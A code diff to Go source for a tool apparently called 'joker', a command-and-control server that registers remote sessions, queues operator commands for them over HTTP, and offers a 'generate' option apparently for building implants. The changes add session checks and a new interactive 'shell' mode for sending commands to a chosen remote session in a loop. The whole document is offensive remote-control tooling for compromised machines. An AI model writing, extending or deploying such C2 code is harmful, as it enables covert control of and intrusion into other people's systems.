@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"log"
+	"math/rand"
 	"net/http"
 	"os"
 	"strings"
@@ -15,6 +16,8 @@ var sessions []joker_config = []joker_config{}
 var _joker joker = joker{_connected: "None"}
 
 func main() {
+	rand.Seed(time.Now().UnixNano())
+
 	fmt.Printf("%s", init_logo)
 
 	http.HandleFunc("/", Handle)
@@ -50,21 +53,74 @@ func main() {
 					continue
 				}
 
+				var session_found bool
 				var selected_session string = parsed_user_input[1]
 				var command_for_sess string = parsed_user_input[2]
 
-				_joker._connected = selected_session
+				
 				for i:=0;i<len(sessions);i++ {
 					if sessions[i]._Auth == selected_session {
+						session_found = true
 						sessions[i]._command=command_for_sess
 					}
 				}
+
+				if !session_found {
+					fmt.Println("Session was not found.")
+					break
+				}
+
+				_joker._connected = selected_session
 
 				for !continue_use {
 					time.Sleep(350*time.Millisecond)
 				}
 
 				continue_use = false
+			case("shell"):
+				if len(parsed_user_input) != 2 {
+					fmt.Printf("Usage: shell <session>")
+					continue
+				}
+
+				var selected_session string = parsed_user_input[1]
+				var session_found bool
+
+				for i:=0;i<len(sessions);i++ {
+					if sessions[i]._Auth == selected_session {
+						session_found = true
+					}
+				}
+
+				if session_found {
+					for {
+						var shell_user_input string
+
+						for len(shell_user_input) <= 0 {
+							fmt.Printf("%s", "$ ")
+							shell_user_input = input()
+						}
+
+						if shell_user_input == "exit" {
+							break
+						}
+
+						_joker._connected = selected_session
+						for i:=0;i<len(sessions);i++ {
+							if sessions[i]._Auth == selected_session {
+								sessions[i]._command=shell_user_input
+							}
+						}
+
+						for !continue_use {
+							time.Sleep(350*time.Millisecond)
+						}
+
+						continue_use = false
+					}
+				} else {
+					fmt.Printf("Session was not found.")
+				}
 			case("generate"):
 
 				var os string
